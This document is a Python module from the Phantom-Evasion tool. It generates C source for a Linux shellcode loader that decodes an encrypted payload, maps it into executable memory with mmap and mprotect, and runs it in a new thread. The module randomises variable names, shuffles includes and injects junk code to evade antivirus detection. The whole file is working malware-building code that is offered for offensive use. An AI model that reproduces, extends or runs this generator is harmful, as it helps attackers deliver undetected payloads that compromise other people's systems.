
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #    along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.          #
     #                                                                                      #
     ########################################################################################

import sys
sys.path.append("Modules/payloads/auxiliar")

from usefull import EncryptionManager
from usefull import varname_creator
from usefull import JunkInjector
from usefull import IncludeShuffler
from usefull import WriteSource


def ShellInject_C_linux(ModOpt):

    Randbufname = varname_creator()

    Payload = ModOpt["Payload"]
    Encryption = ModOpt["Encode"]
    Arch = ModOpt["Arch"]
    MemAlloc = ModOpt["MemAlloc"]
    ExecMethod = ModOpt["ExecMethod"]


    DecodeKit = EncryptionManager(Encryption,Payload,Randbufname)
    Payload = DecodeKit[0]     # encoded shellcode 
    ModOpt["Decoder"] = DecodeKit[1] # decoder stub or string = False if decoder is not necessary


    Randmem = varname_creator()
    Randptr = varname_creator()
    Randinj = varname_creator()

    Ret_code = ""

    Include_List = ["#include <stdlib.h>\n","#include <unistd.h>\n","#include <stdio.h>\n","#include <string.h>\n","#include <sys/mman.h>\n","#include <math.h>\n","#include <pthread.h>\n"]

    Ret_code += IncludeShuffler(Include_List)

    Ret_code += "int main(int argc,char * argv[]){\n"

    Ret_code += "$:START\n"

    Ret_code += "unsigned char " + Randbufname + "[] = \"" + ModOpt["Payload"] + "\";\n"

    if ModOpt["MemAlloc"] == "Heap_RWX":

        fl = "PROT_READ|PROT_WRITE|PROT_EXEC"
    else:
        fl = "PROT_READ|PROT_WRITE"

    Ret_code += "void * " + Randptr + " = mmap(0,sizeof(" + Randbufname + ")," + fl + ",MAP_PRIVATE|MAP_ANON,-1,0);\n"

    if ModOpt["Decoder"] != "False":

        Ret_code += ModOpt["Decoder"]

    if ModOpt["MemAlloc"] in ["Heap_RW/RX","Heap_RW/RWX"]:

        if "RWX" in ModOpt["MemAlloc"]:

            fl = "PROT_READ|PROT_WRITE|PROT_EXEC"
        else:
            fl = "PROT_READ|PROT_EXEC"

        Ret_code += "mprotect(" + Randptr + ",sizeof(" + Randbufname + ")," + fl + ");\n"

    Ret_code += "memcpy(" + Randptr + ","+ Randbufname + ", sizeof(" + Randbufname + "));\n"

    Ret_code += "pthread_create(0,NULL," + Randptr + ",NULL);\n"

    Ret_code += "$:END\n"

    Ret_code = JunkInjector(Ret_code,ModOpt["JI"],ModOpt["JF"],0,ModOpt["JR"])

    Ret_code += "return 0;}"

    WriteSource("Source.c",Ret_code)

